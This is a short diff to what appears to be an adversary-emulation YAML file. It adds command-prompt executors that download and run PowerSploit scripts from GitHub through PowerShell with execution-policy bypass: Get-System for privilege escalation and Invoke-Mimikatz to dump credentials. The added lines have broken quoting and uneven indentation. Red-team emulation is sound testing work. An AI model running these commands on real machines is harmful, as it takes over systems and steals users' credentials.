@@ -330,6 +330,11 @@
         command: |
           powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"
 
+    executors:
+    - name: command_prompt
+      command: |
+        "powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"""
+
 # Phase 1: Credential Access
 
 - id: ff77db3d-ded1-48da-9885-8dfc097edec0
@@ -347,6 +352,11 @@
       psh:
         command: |
           powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+  executors:
+    - name: command_prompt
+      command: |
+        "powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
 
 - id: 97412b40-4940-4da1-8bff-6f11d42bca26
   name: WCE Credential Access
